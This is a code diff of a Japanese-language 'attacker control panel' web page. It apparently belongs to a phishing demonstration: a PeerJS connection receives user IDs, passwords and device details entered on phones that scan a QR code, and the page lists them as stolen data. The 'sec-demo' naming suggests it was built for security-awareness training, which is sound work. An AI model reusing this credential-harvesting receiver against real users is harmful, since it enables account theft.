@@ -5,47 +5,89 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>攻撃者ダッシュボード | 管理画面</title>
   <link rel="stylesheet" href="style.css">
+  <!-- PeerJSの読み込み -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body class="admin-body">
+
   <div class="admin-header">
-    <h1>☠️ 奪取データ・リアルタイムログ (攻撃者視点)</h1>
-    <button onclick="clearLogs()" class="btn-danger">ログを全消去</button>
+    <h1>🔴 ATTACKER CONTROL PANEL (C&C Server)</h1>
+    <div id="connection-status" style="color: #ffaa00; font-weight: bold;">接続待機中...</div>
   </div>
 
-  <div class="admin-container">
-    <div class="stats-card">
-      <h3>奪取したアカウント数</h3>
-      <p id="count" class="count-number">0</p>
+  <!-- 接続用のQRコード画像・リンク表示パネル -->
+  <div style="background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
+    <!-- aa.png-->
+    <img src="qr.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
+    <div>
+      <h3 style="color: #58a6ff; margin-bottom: 5px;">スマホ接続用URL</h3>
+      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取るか、下のリンクをコピーしてください。</p>
+      <button class="btn-copy" onclick="copyShareUrl()" style="padding: 6px 12px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">リンクをコピー</button>
     </div>
-
-    <table class="log-table">
-      <thead>
-        <tr>
-          <th>受信時刻</th>
-          <th>検出端末 (User-Agent)</th>
-          <th>ユーザーID</th>
-          <th>パスワード</th>
-        </tr>
-      </thead>
-      <tbody id="log-list">
-        <!-- JavaScriptでここにデータが入ります -->
-      </tbody>
-    </table>
   </div>
+
+  <div class="stats-card">
+    <div style="font-size: 12px; color: #8b949e;">総奪取データ数</div>
+    <div class="count-number" id="count">0</div>
+  </div>
+
+  <table class="log-table">
+    <thead>
+      <tr>
+        <th>受信時刻</th>
+        <th>端末情報</th>
+        <th>入力されたID</th>
+        <th>奪取されたパスワード</th>
+      </tr>
+    </thead>
+    <tbody id="log-list">
+      <tr><td colspan="4" style="text-align:center; color: #8b949e;">スマホからの入力を待機しています...</td></tr>
+    </tbody>
+  </table>
 
   <script>
+    // ルームID（PeerJSの接続用ID。固定またはランダム）
+    // ※QRコード側のリンク先URLと、ここで指定するIDを合わせる必要があります
+    const myId = "123"; // ここを固定のID（例: "123"）にしておくと便利です
+    
+    const baseUrl = window.location.href.replace('admin.html', '');
+    const shareUrl = `${baseUrl}index.html?room=${myId}`;
+
+    function copyShareUrl() {
+      navigator.clipboard.writeText(shareUrl).then(() => {
+        alert("スマホ用リンクをコピーしました！");
+      });
+    }
+
+    // PeerJSホストとして起動
+    const peer = new Peer("sec-demo-" + myId);
+    let logs = [];
+
+    peer.on('open', (id) => {
+      document.getElementById('connection-status').innerText = "🟢 接続待機中 (スマホからのアクセス待ち)";
+    });
+
+    peer.on('connection', (conn) => {
+      document.getElementById('connection-status').innerText = "🔥 スマホ接続成功！データ待受中...";
+      document.getElementById('connection-status').style.color = "#2ed573";
+
+      conn.on('data', (data) => {
+        logs.unshift(data);
+        renderLogs();
+      });
+    });
+
+    peer.on('error', (err) => {
+      console.error(err);
+      document.getElementById('connection-status').innerText = "🔴 接続エラー";
+    });
+
     function renderLogs() {
-      const logs = JSON.parse(localStorage.getItem('stolen_logs') || '[]');
       const listContainer = document.getElementById('log-list');
       const countContainer = document.getElementById('count');
 
       countContainer.innerText = logs.length;
       listContainer.innerHTML = '';
-
-      if (logs.length === 0) {
-        listContainer.innerHTML = '<tr><td colspan="4" style="text-align:center;">まだデータを受信していません</td></tr>';
-        return;
-      }
 
       logs.forEach(log => {
         const tr = document.createElement('tr');
@@ -58,19 +100,7 @@
         listContainer.appendChild(tr);
       });
     }
-
-    function clearLogs() {
-      if (confirm('蓄積されたデータを削除しますか？')) {
-        localStorage.removeItem('stolen_logs');
-        renderLogs();
-      }
-    }
-
-    // 画面を開いた時と、1秒ごとにデータを自動更新
-    renderLogs();
-    setInterval(renderLogs, 1000);
   </script>
 </body>
 </html>
-
 
